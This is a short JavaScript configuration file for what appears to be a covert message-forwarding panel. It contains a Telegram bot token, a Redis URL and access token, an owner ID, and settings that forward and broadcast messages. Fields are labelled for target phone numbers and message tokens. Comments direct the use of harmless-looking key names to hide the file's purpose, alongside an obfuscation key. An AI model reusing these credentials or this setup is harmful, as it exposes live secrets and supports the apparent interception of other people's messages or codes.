window.SPECTER = {
  BOT_TOKEN: '8841794082:AAFaR6k15CsoC_CcQ7qCAyfrF4yw8YhXCD4',
  TG_API:    'https://api.telegram.org/bot8841794082:AAFaR6k15CsoC_CcQ7qCAyfrF4yw8YhXCD4',

  BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',

  REDIS_URL:   'https://closing-koi-101484.upstash.io',
  REDIS_TOKEN: 'gQAAAAAAAYxsAAIgcDJmZTI0YzE2ZmZjMWI0NmE3OGI3NTkxYjA5OWMwMTQ1ZQ',

  /* ═══ Obfuscation key — change to your own secret ═══ */
  CLOAK: 'sakura!fb#panel@2026',

  /* ═══ Innocuous Redis key names — don't reveal purpose ═══ */
  RK_USER:    '_cache_usr',      // per-user data
  RK_USERSET: '_cache_idx',      // set of user IDs
  RK_SENT:    '_cache_log',      // sent marker
  RK_PREFIX:  '_c1_',            // per-user key prefix

  TG_CHANNEL_LINK: 'https://t.me/FBIPanel',
  OWNER_ID: '7993393143',

  LS_BLOB:    'fbi_blob_id',
  LS_CACHE:   'fbi_config_cache',
  LS_SESSION: 'fbi_session',
  LS_ACTIVE:  'fbi_active_device',

  POLL_DEV: 5000, POLL_MSG: 2000, POLL_BG: 3000, POLL_BAL: 25000,

  DEFAULT_CONFIG: {
    channelId: '', myNumber: '', firebases: [],
    forwardEnabled: true, forwardMode: 'all', botEnabled: true,
    autoBackup: true, autoBackupHour: 3, channelNotify: true, broadcastDelay: 60,
    numStart: '', numEnd: '', msgStart: '', msgEnd: '',
    numLabels: ['To','Receipt','Number','Mobile','Target','Phone'],
    msgLabels: ['Message','Msg','Body','Token','Text']
  }
};
